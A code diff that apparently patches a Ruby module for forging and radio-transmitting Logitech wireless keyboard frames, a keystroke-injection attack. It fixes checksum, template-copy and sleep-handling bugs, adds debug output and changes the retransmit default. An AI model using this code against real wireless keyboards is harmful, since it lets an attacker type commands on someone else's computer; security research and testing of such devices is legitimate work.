@@ -34,7 +34,7 @@ module NordicRF
     (0..payload.size - 1).each do |n|
       cksum = (cksum - payload[n]) & 0xff
     end
-    chksum = (cksum + 1) & 0xff
+    cksum = (cksum + 1) & 0xff
     payload[-1] = cksum
     return payload
   end
@@ -59,23 +59,25 @@ module NordicRF
       end
       next_key = nil
       next_key = attack[i+1] if i < attack.size - 1
-      payload = payload_template
+      payload = payload_template.dup
       if key["hid"] || key["mod"]
+         print_status("DEBUG: HID || MOD #{key.inspect}")
          payload[2] = key["mod"]
          payload[3] = key["hid"]
          key["frames"] << [logitech_checksum(payload), 12]
          key["frames"] << [keepalive, 0]
          if not next_key 
-           key["frames"] << [logitech_checksum(payload_template), 0]
-         elsif key["hid"] == next_key["hid"] || next_key["sleep"]
-           key["frames"] << [logitech_checksum(payload_template), 0]
+           key["frames"] << [logitech_checksum(payload_template.dup), 0]
+         elsif key["hid"] == next_key["hid"] || next_key["sleep"] > 0
+           key["frames"] << [logitech_checksum(payload_template.dup), 0]
          end
-      elsif key["sleep"]
+      elsif key["sleep"] > 0
          count = key["sleep"].int / 10
          (0..count).each do
            key["frames"] << [keepalive, 10]
          end
       end
+      print_status("DEBUG: Packed frames=#{key["frames"]}")
       attack[i] = key
     end
     return attack
@@ -84,12 +86,12 @@ module NordicRF
   # After building frames use transmit keys to broadcast the payloads
   # @param keys [Hash] generated from build_xxx_frames
   # @param repeat [Integer] How many times to try to retransmit on a set channel
-  def transmit_frames(keys, repeat=15)
+  def transmit_frames(keys, repeat=1)
     enable_crc
     keys.each do |key|
       key["frames"].each do |frame|
         msg = frame[0].map(&:chr).join
-        rfxmit(msg, 1)
+        rfxmit(msg, repeat)
         sleep(frame[1] / 1000.0)
       end
     end
